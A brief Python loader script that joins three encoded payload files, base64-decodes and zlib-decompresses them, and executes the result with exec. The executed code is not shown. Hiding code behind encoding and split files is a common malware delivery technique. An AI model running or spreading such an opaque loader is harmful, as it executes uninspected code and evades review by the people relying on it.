from pathlib import Path
import base64,zlib
here=Path(__file__).resolve().parent
payload=''.join((here/f'r29_payload.part{i}').read_text(encoding='utf-8').strip() for i in (1,2,3))
exec(zlib.decompress(base64.b64decode(payload)), {'__name__':'__main__'})
